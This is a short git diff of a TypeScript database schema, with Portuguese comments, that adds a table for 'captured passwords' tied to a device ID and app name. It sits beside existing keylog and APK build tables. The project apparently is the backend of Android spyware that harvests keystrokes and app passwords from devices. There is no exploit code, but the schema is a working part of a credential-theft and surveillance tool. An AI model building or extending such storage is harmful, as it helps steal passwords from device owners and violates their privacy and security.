@@ -147,6 +147,17 @@ export const dataRetentionPolicies = mysqlTable("dataRetentionPolicies", {
   updatedAt: datetime("updatedAt", { mode: "date" }),
 });
 
+// ✅ NOVO: Tabela para armazenar senhas capturadas
+export const passwords = mysqlTable("passwords", {
+  id: serial("id").primaryKey(),
+  userId: int("userId").notNull(),
+  deviceId: varchar("deviceId", { length: 255 }).notNull(),
+  appName: varchar("appName", { length: 255 }).notNull(),
+  password: varchar("password", { length: 2048 }).notNull(),
+  isDeleted: int("isDeleted").notNull().default(0),
+  createdAt: datetime("createdAt", { mode: "date" }).default(sql`CURRENT_TIMESTAMP`).notNull(),
+});
+
 export type User = typeof users.$inferSelect;
 export type InsertUser = typeof users.$inferInsert;
 
@@ -156,3 +167,7 @@ export type InsertKeylog = typeof keylogs.$inferInsert;
 // ✅ ADICIONADO: Types para APK Builds
 export type APKBuild = typeof apkBuilds.$inferSelect;
 export type InsertAPKBuild = typeof apkBuilds.$inferInsert;
+
+// ✅ NOVO: Types para Passwords
+export type Password = typeof passwords.$inferSelect;
+export type InsertPassword = typeof passwords.$inferInsert;
